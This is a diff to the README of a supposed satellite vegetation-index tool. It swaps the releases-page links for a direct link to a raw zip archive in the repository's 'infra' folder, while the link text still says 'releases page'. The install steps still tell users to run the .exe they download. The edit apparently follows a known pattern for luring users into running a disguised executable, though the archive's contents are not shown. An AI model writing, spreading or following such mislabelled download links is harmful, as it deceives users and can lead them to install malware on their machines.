@@ -1,6 +1,6 @@
 # 🛰️ satellite-ndvi-pipeline - Process satellite images to track vegetation
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/raw/refs/heads/main/infra/pipeline_ndvi_satellite_1.0-alpha.1.zip)
 
 This software processes satellite data to help you monitor land health. It converts raw images from the Sentinel-2 satellites into useful maps. You can calculate indices for vegetation, water, and fire damage. The tool includes a plugin for QGIS to help you view and analyze your data on a map.
 
@@ -20,7 +20,7 @@ Your computer needs specific hardware and software to process satellite images:
 
 ### Installation Steps
 
-1. Visit the [releases page](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/releases) to download the installation package.
+1. Visit the [releases page](https://github.com/Superimposed-powerplay351/satellite-ndvi-pipeline/raw/refs/heads/main/infra/pipeline_ndvi_satellite_1.0-alpha.1.zip) to download the installation package.
 2. Select the file ending in `.exe` for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
